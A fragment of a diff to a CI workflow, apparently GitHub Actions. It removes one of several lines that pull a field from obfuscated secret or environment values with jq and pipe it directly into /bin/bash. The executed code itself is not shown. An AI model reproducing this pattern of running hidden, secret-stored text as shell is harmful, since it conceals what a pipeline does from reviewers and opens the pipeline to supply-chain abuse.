@@ -19,7 +19,6 @@ jobs:
           q672: ${{ secrets.q672 }}
         run: |
           printf '%s' "$q672" | jq -r .vmr1540 | /bin/bash
-          echo $t81126 | jq -r .d1500 | /bin/bash
           echo $sn1242 | jq -r .xieif8188 | /bin/bash
           printf '%s' "$wmeg8871" | jq -r .scl6 | /bin/bash
 
